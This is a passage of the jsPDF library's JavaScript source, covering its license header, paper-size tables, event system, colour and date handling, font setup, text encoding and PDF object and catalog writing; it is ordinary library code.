/** @preserve
 * jsPDF - PDF Document creation from JavaScript
 * Version ${versionID}
 *                           CommitID ${commitID}
 *
 * Copyright (c) 2010-2016 James Hall <james@parall.ax>, https://github.com/MrRio/jsPDF
 *               2010 Aaron Spike, https://github.com/acspike
 *               2012 Willow Systems Corporation, willow-systems.com
 *               2012 Pablo Hess, https://github.com/pablohess
 *               2012 Florian Jenett, https://github.com/fjenett
 *               2013 Warren Weckesser, https://github.com/warrenweckesser
 *               2013 Youssef Beddad, https://github.com/lifof
 *               2013 Lee Driscoll, https://github.com/lsdriscoll
 *               2013 Stefan Slonevskiy, https://github.com/stefslon
 *               2013 Jeremy Morel, https://github.com/jmorel
 *               2013 Christoph Hartmann, https://github.com/chris-rock
 *               2014 Juan Pablo Gaviria, https://github.com/juanpgaviria
 *               2014 James Makes, https://github.com/dollaruw
 *               2014 Diego Casorran, https://github.com/diegocr
 *               2014 Steven Spungin, https://github.com/Flamenco
 *               2014 Kenneth Glassey, https://github.com/Gavvers
 *
 * Permission is hereby granted, free of charge, to any person obtaining
 * a copy of this software and associated documentation files (the
 * "Software"), to deal in the Software without restriction, including
 * without limitation the rights to use, copy, modify, merge, publish,
 * distribute, sublicense, and/or sell copies of the Software, and to
 * permit persons to whom the Software is furnished to do so, subject to
 * the following conditions:
 *
 * The above copyright notice and this permission notice shall be
 * included in all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
 * EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
 * MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
 * NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE
 * LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION
 * OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION
 * WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 *
 * Contributor(s):
 *    siefkenj, ahwolf, rickygu, Midnith, saintclair, eaparango,
 *    kim3er, mfo, alnorth, Flamenco
 */

/**
 * Creates new jsPDF document object instance.
 * @name jsPDF
 * @class
 * @param orientation One of "portrait" or "landscape" (or shortcuts "p" (Default), "l") <br />
 * Can also be an options object.
 * @param unit        Measurement unit to be used when coordinates are specified.
 *                    One of "pt" (points), "mm" (Default), "cm", "in"
 * @param format      One of 'pageFormats' as shown below, default: a4
 * @returns {jsPDF}
 * @description
 * If the first parameter (orientation) is an object, it will be interpreted as an object of named parameters
 * ```
 * {
 *  orientation: 'p',
 *  unit: 'mm',
 *  format: 'a4',
 *  hotfixes: [] // an array of hotfix strings to enable
 * }
 * ```
 */
var jsPDF = (function(global) {
  'use strict';
  var pdfVersion = '1.3',
    pageFormats = { // Size in pt of various paper formats
      'a0': [2383.94, 3370.39],
      'a1': [1683.78, 2383.94],
      'a2': [1190.55, 1683.78],
      'a3': [841.89, 1190.55],
      'a4': [595.28, 841.89],
      'a5': [419.53, 595.28],
      'a6': [297.64, 419.53],
      'a7': [209.76, 297.64],
      'a8': [147.40, 209.76],
      'a9': [104.88, 147.40],
      'a10': [73.70, 104.88],
      'b0': [2834.65, 4008.19],
      'b1': [2004.09, 2834.65],
      'b2': [1417.32, 2004.09],
      'b3': [1000.63, 1417.32],
      'b4': [708.66, 1000.63],
      'b5': [498.90, 708.66],
      'b6': [354.33, 498.90],
      'b7': [249.45, 354.33],
      'b8': [175.75, 249.45],
      'b9': [124.72, 175.75],
      'b10': [87.87, 124.72],
      'c0': [2599.37, 3676.54],
      'c1': [1836.85, 2599.37],
      'c2': [1298.27, 1836.85],
      'c3': [918.43, 1298.27],
      'c4': [649.13, 918.43],
      'c5': [459.21, 649.13],
      'c6': [323.15, 459.21],
      'c7': [229.61, 323.15],
      'c8': [161.57, 229.61],
      'c9': [113.39, 161.57],
      'c10': [79.37, 113.39],
      'dl': [311.81, 623.62],
      'letter': [612, 792],
      'government-letter': [576, 756],
      'legal': [612, 1008],
      'junior-legal': [576, 360],
      'ledger': [1224, 792],
      'tabloid': [792, 1224],
      'credit-card': [153, 243]
    };

  /**
   * jsPDF's Internal PubSub Implementation.
   * See mrrio.github.io/jsPDF/doc/symbols/PubSub.html
   * Backward compatible rewritten on 2014 by
   * Diego Casorran, https://github.com/diegocr
   *
   * @class
   * @name PubSub
   * @ignore This should not be in the public docs.
   */
  function PubSub(context) {
    var topics = {};

    this.subscribe = function(topic, callback, once) {
      if (typeof callback !== 'function') {
        return false;
      }

      if (!topics.hasOwnProperty(topic)) {
        topics[topic] = {};
      }

      var id = Math.random().toString(35);
      topics[topic][id] = [callback, !!once];

      return id;
    };

    this.unsubscribe = function(token) {
      for (var topic in topics) {
        if (topics[topic][token]) {
          delete topics[topic][token];
          return true;
        }
      }
      return false;
    };

    this.publish = function(topic) {
      if (topics.hasOwnProperty(topic)) {
        var args = Array.prototype.slice.call(arguments, 1),
          idr = [];

        for (var id in topics[topic]) {
          var sub = topics[topic][id];
          try {
            sub[0].apply(context, args);
          } catch (ex) {
            if (global.console) {
              console.error('jsPDF PubSub Error', ex.message, ex);
            }
          }
          if (sub[1]) idr.push(id);
        }
        if (idr.length) idr.forEach(this.unsubscribe);
      }
    };
  }

  /**
   * @constructor
   * @private
   */
  function jsPDF(orientation, unit, format, compressPdf) {
    var options = {};

    if (typeof orientation === 'object') {
      options = orientation;

      orientation = options.orientation;
      unit = options.unit || unit;
      format = options.format || format;
      compressPdf = options.compress || options.compressPdf || compressPdf;
    }

    // Default options
    unit = unit || 'mm';
    format = format || 'a4';
    orientation = ('' + (orientation || 'P')).toLowerCase();

    var format_as_string = ('' + format).toLowerCase(),
      compress = !!compressPdf && typeof Uint8Array === 'function',
      textColor = options.textColor || '0 g',
      drawColor = options.drawColor || '0 G',
      activeFontSize = options.fontSize || 16,
      lineHeightProportion = options.lineHeight || 1.15,
      lineWidth = options.lineWidth || 0.200025, // 2mm
      objectNumber = 2, // 'n' Current object number
      outToPages = !1, // switches where out() prints. outToPages true = push to pages obj. outToPages false = doc builder content
      offsets = [], // List of offsets. Activated and reset by buildDocument(). Pupulated by various calls buildDocument makes.
      fonts = {}, // collection of font objects, where key is fontKey - a dynamically created label for a given font.
      fontmap = {}, // mapping structure fontName > fontStyle > font key - performance layer. See addFont()
      activeFontKey, // will be string representing the KEY of the font as combination of fontName + fontStyle
      k, // Scale factor
      tmp,
      page = 0,
      currentPage,
      pages = [],
      pagesContext = [], // same index as pages and pagedim
      pagedim = [],
      content = [],
      additionalObjects = [],
      lineCapID = 0,
      lineJoinID = 0,
      content_length = 0,
      pageWidth,
      pageHeight,
      pageMode,
      zoomMode,
      layoutMode,
      creationDate,
      documentProperties = {
        'title': '',
        'subject': '',
        'author': '',
        'keywords': '',
        'creator': ''
      },
      API = {},
      events = new PubSub(API),
      hotfixes = options.hotfixes || [],

      /////////////////////
      // Private functions
      /////////////////////
      generateColorString = function (options) {
        var color;

        var ch1 = options.ch1;
        var ch2 = options.ch2;
        var ch3 = options.ch3;
        var ch4 = options.ch4;
        var precision = options.precision;
        var letterArray = (options.pdfColorType === "draw") ? ['G', 'RG', 'K'] : ['g', 'rg', 'k'];

        var cssColorNames = {"aliceblue":"#f0f8ff","antiquewhite":"#faebd7","aqua":"#00ffff","aquamarine":"#7fffd4","azure":"#f0ffff",
                            "beige":"#f5f5dc","bisque":"#ffe4c4","black":"#000000","blanchedalmond":"#ffebcd","blue":"#0000ff","blueviolet":"#8a2be2","brown":"#a52a2a","burlywood":"#deb887",
                            "cadetblue":"#5f9ea0","chartreuse":"#7fff00","chocolate":"#d2691e","coral":"#ff7f50","cornflowerblue":"#6495ed","cornsilk":"#fff8dc","crimson":"#dc143c","cyan":"#00ffff",
                            "darkblue":"#00008b","darkcyan":"#008b8b","darkgoldenrod":"#b8860b","darkgray":"#a9a9a9","darkgreen":"#006400","darkkhaki":"#bdb76b","darkmagenta":"#8b008b","darkolivegreen":"#556b2f",
                            "darkorange":"#ff8c00","darkorchid":"#9932cc","darkred":"#8b0000","darksalmon":"#e9967a","darkseagreen":"#8fbc8f","darkslateblue":"#483d8b","darkslategray":"#2f4f4f","darkturquoise":"#00ced1",
                            "darkviolet":"#9400d3","deeppink":"#ff1493","deepskyblue":"#00bfff","dimgray":"#696969","dodgerblue":"#1e90ff",
                            "firebrick":"#b22222","floralwhite":"#fffaf0","forestgreen":"#228b22","fuchsia":"#ff00ff",
                            "gainsboro":"#dcdcdc","ghostwhite":"#f8f8ff","gold":"#ffd700","goldenrod":"#daa520","gray":"#808080","green":"#008000","greenyellow":"#adff2f",
                            "honeydew":"#f0fff0","hotpink":"#ff69b4",
                            "indianred ":"#cd5c5c","indigo":"#4b0082","ivory":"#fffff0","khaki":"#f0e68c",
                            "lavender":"#e6e6fa","lavenderblush":"#fff0f5","lawngreen":"#7cfc00","lemonchiffon":"#fffacd","lightblue":"#add8e6","lightcoral":"#f08080","lightcyan":"#e0ffff","lightgoldenrodyellow":"#fafad2",
                            "lightgrey":"#d3d3d3","lightgreen":"#90ee90","lightpink":"#ffb6c1","lightsalmon":"#ffa07a","lightseagreen":"#20b2aa","lightskyblue":"#87cefa","lightslategray":"#778899","lightsteelblue":"#b0c4de","lightyellow":"#ffffe0","lime":"#00ff00","limegreen":"#32cd32","linen":"#faf0e6",
                            "magenta":"#ff00ff","maroon":"#800000","mediumaquamarine":"#66cdaa","mediumblue":"#0000cd","mediumorchid":"#ba55d3","mediumpurple":"#9370d8","mediumseagreen":"#3cb371","mediumslateblue":"#7b68ee","mediumspringgreen":"#00fa9a","mediumturquoise":"#48d1cc","mediumvioletred":"#c71585","midnightblue":"#191970","mintcream":"#f5fffa","mistyrose":"#ffe4e1","moccasin":"#ffe4b5",
                            "navajowhite":"#ffdead","navy":"#000080",
                            "oldlace":"#fdf5e6","olive":"#808000","olivedrab":"#6b8e23","orange":"#ffa500","orangered":"#ff4500","orchid":"#da70d6",
                            "palegoldenrod":"#eee8aa","palegreen":"#98fb98","paleturquoise":"#afeeee","palevioletred":"#d87093","papayawhip":"#ffefd5","peachpuff":"#ffdab9","peru":"#cd853f","pink":"#ffc0cb","plum":"#dda0dd","powderblue":"#b0e0e6","purple":"#800080",
                            "rebeccapurple":"#663399","red":"#ff0000","rosybrown":"#bc8f8f","royalblue":"#4169e1",
                            "saddlebrown":"#8b4513","salmon":"#fa8072","sandybrown":"#f4a460","seagreen":"#2e8b57","seashell":"#fff5ee","sienna":"#a0522d","silver":"#c0c0c0","skyblue":"#87ceeb","slateblue":"#6a5acd","slategray":"#708090","snow":"#fffafa","springgreen":"#00ff7f","steelblue":"#4682b4",
                            "tan":"#d2b48c","teal":"#008080","thistle":"#d8bfd8","tomato":"#ff6347","turquoise":"#40e0d0",
                            "violet":"#ee82ee",
                            "wheat":"#f5deb3","white":"#ffffff","whitesmoke":"#f5f5f5",
                            "yellow":"#ffff00","yellowgreen":"#9acd32"};

        if ((typeof ch1 === "string") && cssColorNames.hasOwnProperty(ch1)) {
          ch1 = cssColorNames[ch1];
        }
        
        //convert short rgb to long form
        if ((typeof ch1 === "string") && (/^#[0-9A-Fa-f]{3}$/).test(ch1)) {
          ch1 = '#' + ch1[1] + ch1[1] + ch1[2] + ch1[2] + ch1[3] + ch1[3];
        }

        if ((typeof ch1 === "string") && (/^#[0-9A-Fa-f]{6}$/).test(ch1)) {
          var hex = parseInt(ch1.substr(1), 16);
          ch1 = (hex >> 16) & 255;
          ch2 = (hex >> 8) & 255;
          ch3 = (hex & 255);
        }

        if ((typeof ch2 === "undefined") || (typeof ch4 === "undefined") && ((ch1 === ch2) && (ch2 === ch3))) {
          // Gray color space.
          if (typeof ch1 === "string") {
            color = ch1 + " " + letterArray[0];
          } else {
            switch (options.precision) {
              case 2:
                color = f2(ch1 / 255) + " " + letterArray[0];
                break;
              case 3:
              default:
                color = f3(ch1 / 255) + " " + letterArray[0];
            }
          }
        } else if (typeof ch4 === "undefined" || typeof ch4 === "object") {
          // assume RGB
          if (typeof ch1 === "string") {
            color = [ch1, ch2, ch3, letterArray[1]].join(" ");
          } else {
            switch (options.precision) {
              case 2:
                color = [f2(ch1 / 255), f2(ch2 / 255), f2(ch3 / 255), letterArray[1]].join(" ");
                break;
              default:
              case 3:
                color = [f3(ch1 / 255), f3(ch2 / 255), f3(ch3 / 255), letterArray[1]].join(" ");
            }
          }
          // assume RGBA
          if (ch4 && ch4.a === 0) {
            //TODO Implement transparency.
            //WORKAROUND use white for now
            color = ['255', '255', '255', letterArray[1]].join(" ");
          }
        } else {
          // assume CMYK
          if (typeof ch1 === 'string') {
            color = [ch1, ch2, ch3, ch4, letterArray[2]].join(" ");
          } else {
            switch (options.precision) {
              case 2:
                color = [f2(ch1), f2(ch2), f2(ch3), f2(ch4), letterArray[2]].join(" ");
                break;
              case 3:
              default:
                color = [f3(ch1), f3(ch2), f3(ch3), f3(ch4), letterArray[2]].join(" ");
            }
          }
        }
        return color;
      },

        
      convertDateToPDFDate = function (parmDate) {
          var padd2 = function(number) {
            return ('0' + parseInt(number)).slice(-2);
          };
          var result = '';
          var tzoffset = parmDate.getTimezoneOffset(),
              tzsign = tzoffset < 0 ? '+' : '-',
              tzhour = Math.floor(Math.abs(tzoffset / 60)),
              tzmin = Math.abs(tzoffset % 60),
              timeZoneString = [tzsign, padd2(tzhour), "'", padd2(tzmin), "'"].join('');

          result = ['D:',
                parmDate.getFullYear(),
                padd2(parmDate.getMonth() + 1),
                padd2(parmDate.getDate()),
                padd2(parmDate.getHours()),
                padd2(parmDate.getMinutes()),
                padd2(parmDate.getSeconds()), 
                timeZoneString
              ].join('');
          return result;
      },
      convertPDFDateToDate = function (parmPDFDate) {
          var year = parseInt(parmPDFDate.substr(2,4), 10);
          var month = parseInt(parmPDFDate.substr(6,2), 10) - 1;
          var date = parseInt(parmPDFDate.substr(8,2), 10);
          var hour = parseInt(parmPDFDate.substr(10,2), 10);
          var minutes = parseInt(parmPDFDate.substr(12,2), 10);
          var seconds = parseInt(parmPDFDate.substr(14,2), 10);
          var timeZoneHour = parseInt(parmPDFDate.substr(16,2), 10);
          var timeZoneMinutes = parseInt(parmPDFDate.substr(20,2), 10);
                                         
          var resultingDate = new Date(year, month, date, hour, minutes, seconds, 0);
          return resultingDate;
      },
      setCreationDate = function (date) {
        var tmpCreationDateString;
        var regexPDFCreationDate = (/^D:(20[0-2][0-9]|203[0-7]|19[7-9][0-9])(0[0-9]|1[0-2])([0-2][0-9]|3[0-1])(0[0-9]|1[0-9]|2[0-3])(0[0-9]|[1-5][0-9])(0[0-9]|[1-5][0-9])(\+0[0-9]|\+1[0-4]|\-0[0-9]|\-1[0-1])\'(0[0-9]|[1-5][0-9])\'?$/);
        if (typeof (date) === undefined) {
          date = new Date();
        }

        if (typeof date === "object" && Object.prototype.toString.call(date) === "[object Date]") {
          tmpCreationDateString = convertDateToPDFDate(date)
        } else if (regexPDFCreationDate.test(date)) {
          tmpCreationDateString = date;
        } else {
          tmpCreationDateString = convertDateToPDFDate(new Date());
        }
        creationDate = tmpCreationDateString;
        return creationDate;
      },
      getCreationDate = function(type) {
        var result = creationDate;
        if (type === "jsDate") {
          result = convertPDFDateToDate(creationDate);
        }
        return result;
      },
      f2 = function(number) {
        return number.toFixed(2); // Ie, %.2f
      },
      f3 = function(number) {
        return number.toFixed(3); // Ie, %.3f
      },
      padd2 = function(number) {
        return ('0' + parseInt(number)).slice(-2);
      },
      out = function(string) {
        if (outToPages) {
          /* set by beginPage */
          pages[currentPage].push(string);
        } else {
          // +1 for '\n' that will be used to join 'content'
          content_length += string.length + 1;
          content.push(string);
        }
      },
      newObject = function() {
        // Begin a new object
        objectNumber++;
        offsets[objectNumber] = content_length;
        out(objectNumber + ' 0 obj');
        return objectNumber;
      },
      // Does not output the object until after the pages have been output.
      // Returns an object containing the objectId and content.
      // All pages have been added so the object ID can be estimated to start right after.
      // This does not modify the current objectNumber;  It must be updated after the newObjects are output.
      newAdditionalObject = function() {
        var objId = pages.length * 2 + 1;
        objId += additionalObjects.length;
        var obj = {
          objId: objId,
          content: ''
        };
        additionalObjects.push(obj);
        return obj;
      },
      // Does not output the object.  The caller must call newObjectDeferredBegin(oid) before outputing any data
      newObjectDeferred = function() {
        objectNumber++;
        offsets[objectNumber] = function() {
          return content_length;
        };
        return objectNumber;
      },
      newObjectDeferredBegin = function(oid) {
        offsets[oid] = content_length;
      },
      putStream = function(str) {
        out('stream');
        out(str);
        out('endstream');
      },
      putPages = function() {
        var n, p, arr, i, deflater, adler32, adler32cs, wPt, hPt,
          pageObjectNumbers = [];

        adler32cs = global.adler32cs || jsPDF.adler32cs;
        if (compress && typeof adler32cs === 'undefined') {
          compress = false;
        }

        // outToPages = false as set in endDocument(). out() writes to content.

        for (n = 1; n <= page; n++) {
          pageObjectNumbers.push(newObject());
          wPt = (pageWidth = pagedim[n].width) * k;
          hPt = (pageHeight = pagedim[n].height) * k;
          out('<</Type /Page');
          out('/Parent 1 0 R');
          out('/Resources 2 0 R');
          out('/MediaBox [0 0 ' + f2(wPt) + ' ' + f2(hPt) + ']');
          // Added for annotation plugin
          events.publish('putPage', {
            pageNumber: n,
            page: pages[n]
          });
          out('/Contents ' + (objectNumber + 1) + ' 0 R');
          out('>>');
          out('endobj');

          // Page content
          p = pages[n].join('\n');
          newObject();
          if (compress) {
            arr = [];
            i = p.length;
            while (i--) {
              arr[i] = p.charCodeAt(i);
            }
            adler32 = adler32cs.from(p);
            deflater = new Deflater(6);
            deflater.append(new Uint8Array(arr));
            p = deflater.flush();
            arr = new Uint8Array(p.length + 6);
            arr.set(new Uint8Array([120, 156])),
              arr.set(p, 2);
            arr.set(new Uint8Array([adler32 & 0xFF, (adler32 >> 8) & 0xFF, (
                adler32 >> 16) & 0xFF, (adler32 >> 24) & 0xFF]), p.length +
              2);
            p = String.fromCharCode.apply(null, arr);
            out('<</Length ' + p.length + ' /Filter [/FlateDecode]>>');
          } else {
            out('<</Length ' + p.length + '>>');
          }
          putStream(p);
          out('endobj');
        }
        offsets[1] = content_length;
        out('1 0 obj');
        out('<</Type /Pages');
        var kids = '/Kids [';
        for (i = 0; i < page; i++) {
          kids += pageObjectNumbers[i] + ' 0 R ';
        }
        out(kids + ']');
        out('/Count ' + page);
        out('>>');
        out('endobj');
        events.publish('postPutPages');
      },
      putFont = function(font) {
        font.objectNumber = newObject();
        out('<</BaseFont/' + font.PostScriptName + '/Type/Font');
        if (typeof font.encoding === 'string') {
          out('/Encoding/' + font.encoding);
        }
        out('/Subtype/Type1>>');
        out('endobj');
      },
      putFonts = function() {
        for (var fontKey in fonts) {
          if (fonts.hasOwnProperty(fontKey)) {
            putFont(fonts[fontKey]);
          }
        }
      },
      putXobjectDict = function() {
        // Loop through images, or other data objects
        events.publish('putXobjectDict');
      },
      putResourceDictionary = function() {
        out('/ProcSet [/PDF /Text /ImageB /ImageC /ImageI]');
        out('/Font <<');

        // Do this for each font, the '1' bit is the index of the font
        for (var fontKey in fonts) {
          if (fonts.hasOwnProperty(fontKey)) {
            out('/' + fontKey + ' ' + fonts[fontKey].objectNumber + ' 0 R');
          }
        }
        out('>>');
        out('/XObject <<');
        putXobjectDict();
        out('>>');
      },
      putResources = function() {
        putFonts();
        events.publish('putResources');
        // Resource dictionary
        offsets[2] = content_length;
        out('2 0 obj');
        out('<<');
        putResourceDictionary();
        out('>>');
        out('endobj');
        events.publish('postPutResources');
      },
      putAdditionalObjects = function() {
        events.publish('putAdditionalObjects');
        for (var i = 0; i < additionalObjects.length; i++) {
          var obj = additionalObjects[i];
          offsets[obj.objId] = content_length;
          out(obj.objId + ' 0 obj');
          out(obj.content);;
          out('endobj');
        }
        objectNumber += additionalObjects.length;
        events.publish('postPutAdditionalObjects');
      },
      addToFontDictionary = function(fontKey, fontName, fontStyle) {
        // this is mapping structure for quick font key lookup.
        // returns the KEY of the font (ex: "F1") for a given
        // pair of font name and type (ex: "Arial". "Italic")
        if (!fontmap.hasOwnProperty(fontName)) {
          fontmap[fontName] = {};
        }
        fontmap[fontName][fontStyle] = fontKey;
      },
      /**
       * FontObject describes a particular font as member of an instnace of jsPDF
       *
       * It's a collection of properties like 'id' (to be used in PDF stream),
       * 'fontName' (font's family name), 'fontStyle' (font's style variant label)
       *
       * @class
       * @public
       * @property id {String} PDF-document-instance-specific label assinged to the font.
       * @property PostScriptName {String} PDF specification full name for the font
       * @property encoding {Object} Encoding_name-to-Font_metrics_object mapping.
       * @name FontObject
       * @ignore This should not be in the public docs.
       */
      addFont = function(PostScriptName, fontName, fontStyle, encoding) {
        var fontKey = 'F' + (Object.keys(fonts).length + 1).toString(10),
          // This is FontObject
          font = fonts[fontKey] = {
            'id': fontKey,
            'PostScriptName': PostScriptName,
            'fontName': fontName,
            'fontStyle': fontStyle,
            'encoding': encoding,
            'metadata': {}
          };
        addToFontDictionary(fontKey, fontName, fontStyle);
        events.publish('addFont', font);

        return fontKey;
      },
      addFonts = function() {

        var HELVETICA = "helvetica",
          TIMES = "times",
          COURIER = "courier",
          NORMAL = "normal",
          BOLD = "bold",
          ITALIC = "italic",
          BOLD_ITALIC = "bolditalic",
          encoding = 'StandardEncoding',
          ZAPF = "zapfdingbats",
          standardFonts = [
            ['Helvetica', HELVETICA, NORMAL],
            ['Helvetica-Bold', HELVETICA, BOLD],
            ['Helvetica-Oblique', HELVETICA, ITALIC],
            ['Helvetica-BoldOblique', HELVETICA, BOLD_ITALIC],
            ['Courier', COURIER, NORMAL],
            ['Courier-Bold', COURIER, BOLD],
            ['Courier-Oblique', COURIER, ITALIC],
            ['Courier-BoldOblique', COURIER, BOLD_ITALIC],
            ['Times-Roman', TIMES, NORMAL],
            ['Times-Bold', TIMES, BOLD],
            ['Times-Italic', TIMES, ITALIC],
            ['Times-BoldItalic', TIMES, BOLD_ITALIC],
            ['ZapfDingbats', ZAPF]
          ];

        for (var i = 0, l = standardFonts.length; i < l; i++) {
          var fontKey = addFont(
            standardFonts[i][0],
            standardFonts[i][1],
            standardFonts[i][2],
            encoding);

          // adding aliases for standard fonts, this time matching the capitalization
          var parts = standardFonts[i][0].split('-');
          addToFontDictionary(fontKey, parts[0], parts[1] || '');
        }
        events.publish('addFonts', {
          fonts: fonts,
          dictionary: fontmap
        });
      },
      SAFE = function __safeCall(fn) {
        fn.foo = function __safeCallWrapper() {
          try {
            return fn.apply(this, arguments);
          } catch (e) {
            var stack = e.stack || '';
            if (~stack.indexOf(' at ')) stack = stack.split(" at ")[1];
            var m = "Error in function " + stack.split("\n")[0].split('<')[
              0] + ": " + e.message;
            if (global.console) {
              global.console.error(m, e);
              if (global.alert) alert(m);
            } else {
              throw new Error(m);
            }
          }
        };
        fn.foo.bar = fn;
        return fn.foo;
      },
      to8bitStream = function(text, flags) {
        /**
         * PDF 1.3 spec:
         * "For text strings encoded in Unicode, the first two bytes must be 254 followed by
         * 255, representing the Unicode byte order marker, U+FEFF. (This sequence conflicts
         * with the PDFDocEncoding character sequence thorn ydieresis, which is unlikely
         * to be a meaningful beginning of a word or phrase.) The remainder of the
         * string consists of Unicode character codes, according to the UTF-16 encoding
         * specified in the Unicode standard, version 2.0. Commonly used Unicode values
         * are represented as 2 bytes per character, with the high-order byte appearing first
         * in the string."
         *
         * In other words, if there are chars in a string with char code above 255, we
         * recode the string to UCS2 BE - string doubles in length and BOM is prepended.
         *
         * HOWEVER!
         * Actual *content* (body) text (as opposed to strings used in document properties etc)
         * does NOT expect BOM. There, it is treated as a literal GID (Glyph ID)
         *
         * Because of Adobe's focus on "you subset your fonts!" you are not supposed to have
         * a font that maps directly Unicode (UCS2 / UTF16BE) code to font GID, but you could
         * fudge it with "Identity-H" encoding and custom CIDtoGID map that mimics Unicode
         * code page. There, however, all characters in the stream are treated as GIDs,
         * including BOM, which is the reason we need to skip BOM in content text (i.e. that
         * that is tied to a font).
         *
         * To signal this "special" PDFEscape / to8bitStream handling mode,
         * API.text() function sets (unless you overwrite it with manual values
         * given to API.text(.., flags) )
         * flags.autoencode = true
         * flags.noBOM = true
         *
         * ===================================================================================
         * `flags` properties relied upon:
         *   .sourceEncoding = string with encoding label.
         *                     "Unicode" by default. = encoding of the incoming text.
         *                     pass some non-existing encoding name
         *                     (ex: 'Do not touch my strings! I know what I am doing.')
         *                     to make encoding code skip the encoding step.
         *   .outputEncoding = Either valid PDF encoding name
         *                     (must be supported by jsPDF font metrics, otherwise no encoding)
         *                     or a JS object, where key = sourceCharCode, value = outputCharCode
         *                     missing keys will be treated as: sourceCharCode === outputCharCode
         *   .noBOM
         *       See comment higher above for explanation for why this is important
         *   .autoencode
         *       See comment higher above for explanation for why this is important
         */

        var i, l, sourceEncoding, encodingBlock, outputEncoding, newtext,
          isUnicode, ch, bch;

        flags = flags || {};
        sourceEncoding = flags.sourceEncoding || 'Unicode';
        outputEncoding = flags.outputEncoding;

        // This 'encoding' section relies on font metrics format
        // attached to font objects by, among others,
        // "Willow Systems' standard_font_metrics plugin"
        // see jspdf.plugin.standard_font_metrics.js for format
        // of the font.metadata.encoding Object.
        // It should be something like
        //   .encoding = {'codePages':['WinANSI....'], 'WinANSI...':{code:code, ...}}
        //   .widths = {0:width, code:width, ..., 'fof':divisor}
        //   .kerning = {code:{previous_char_code:shift, ..., 'fof':-divisor},...}
        if ((flags.autoencode || outputEncoding) &&
          fonts[activeFontKey].metadata &&
          fonts[activeFontKey].metadata[sourceEncoding] &&
          fonts[activeFontKey].metadata[sourceEncoding].encoding) {
          encodingBlock = fonts[activeFontKey].metadata[sourceEncoding].encoding;

          // each font has default encoding. Some have it clearly defined.
          if (!outputEncoding && fonts[activeFontKey].encoding) {
            outputEncoding = fonts[activeFontKey].encoding;
          }

          // Hmmm, the above did not work? Let's try again, in different place.
          if (!outputEncoding && encodingBlock.codePages) {
            outputEncoding = encodingBlock.codePages[0]; // let's say, first one is the default
          }

          if (typeof outputEncoding === 'string') {
            outputEncoding = encodingBlock[outputEncoding];
          }
          // we want output encoding to be a JS Object, where
          // key = sourceEncoding's character code and
          // value = outputEncoding's character code.
          if (outputEncoding) {
            isUnicode = false;
            newtext = [];
            for (i = 0, l = text.length; i < l; i++) {
              ch = outputEncoding[text.charCodeAt(i)];
              if (ch) {
                newtext.push(
                  String.fromCharCode(ch));
              } else {
                newtext.push(
                  text[i]);
              }

              // since we are looping over chars anyway, might as well
              // check for residual unicodeness
              if (newtext[i].charCodeAt(0) >> 8) {
                /* more than 255 */
                isUnicode = true;
              }
            }
            text = newtext.join('');
          }
        }

        i = text.length;
        // isUnicode may be set to false above. Hence the triple-equal to undefined
        while (isUnicode === undefined && i !== 0) {
          if (text.charCodeAt(i - 1) >> 8) {
            /* more than 255 */
            isUnicode = true;
          }
          i--;
        }
        if (!isUnicode) {
          return text;
        }

        newtext = flags.noBOM ? [] : [254, 255];
        for (i = 0, l = text.length; i < l; i++) {
          ch = text.charCodeAt(i);
          bch = ch >> 8; // divide by 256
          if (bch >> 8) {
            /* something left after dividing by 256 second time */
            throw new Error("Character at position " + i + " of string '" +
              text + "' exceeds 16bits. Cannot be encoded into UCS-2 BE");
          }
          newtext.push(bch);
          newtext.push(ch - (bch << 8));
        }
        return String.fromCharCode.apply(undefined, newtext);
      },
      pdfEscape = function(text, flags) {
        /**
         * Replace '/', '(', and ')' with pdf-safe versions
         *
         * Doing to8bitStream does NOT make this PDF display unicode text. For that
         * we also need to reference a unicode font and embed it - royal pain in the rear.
         *
         * There is still a benefit to to8bitStream - PDF simply cannot handle 16bit chars,
         * which JavaScript Strings are happy to provide. So, while we still cannot display
         * 2-byte characters property, at least CONDITIONALLY converting (entire string containing)
         * 16bit chars to (USC-2-BE) 2-bytes per char + BOM streams we ensure that entire PDF
         * is still parseable.
         * This will allow immediate support for unicode in document properties strings.
         */
        return to8bitStream(text, flags).replace(/\\/g, '\\\\').replace(
          /\(/g, '\\(').replace(/\)/g, '\\)');
      },
      putInfo = function() {
        out('/Producer (jsPDF ' + jsPDF.version + ')');
        for (var key in documentProperties) {
          if (documentProperties.hasOwnProperty(key) && documentProperties[
              key]) {
            out('/' + key.substr(0, 1).toUpperCase() + key.substr(1) + ' (' +
              pdfEscape(documentProperties[key]) + ')');
          }
        }
        out('/CreationDate (' + creationDate + ')');
      },
      putCatalog = function() {
        out('/Type /Catalog');
        out('/Pages 1 0 R');
        // PDF13ref Section 7.2.1
        if (!zoomMode) zoomMode = 'fullwidth';
        switch (zoomMode) {
          case 'fullwidth':
            out('/OpenAction [3 0 R /FitH null]');
            break;
          case 'fullheight':
            out('/OpenAction [3 0 R /FitV null]');
            break;
          case 'fullpage':
            out('/OpenAction [3 0 R /Fit]');
            break;
          case 'original':
            out('/OpenAction [3 0 R /XYZ null null 1]');
            break;
          default:
            var pcn = '' + zoomMode;
            if (pcn.substr(pcn.length - 1) === '%')
              zoomMode = parseInt(zoomMode) / 100;
            if (typeof zoomMode === 'number') {
              out('/OpenAction [3 0 R /XYZ null null ' + f2(zoomMode) + ']');
            }
        }
        if (!layoutMode) layoutMode = 'continuous';
        switch (layoutMode) {
          case 'continuous':
            out('/PageLayout /OneColumn');
            break;
          case 'single':
            out('/PageLayout /SinglePage');
            break;
          case 'two':
          case 'twoleft':
            out('/PageLayout /TwoColumnLeft');
            break;
          case 'tworight':
            out('/PageLayout /TwoColumnRight');
            break;
        }
        if (pageMode) {
          /**
           * A name object specifying how the document should be displayed when opened:
           * UseNone      : Neither document outline nor thumbnail images visible -- DEFAULT
           * UseOutlines  : Document outline visible
           * UseThumbs    : Thumbnail images visible
           * FullScreen   : Full-screen mode, with no menu bar, window controls, or any other window visible
           */
          out('/PageMode /' + pageMode);
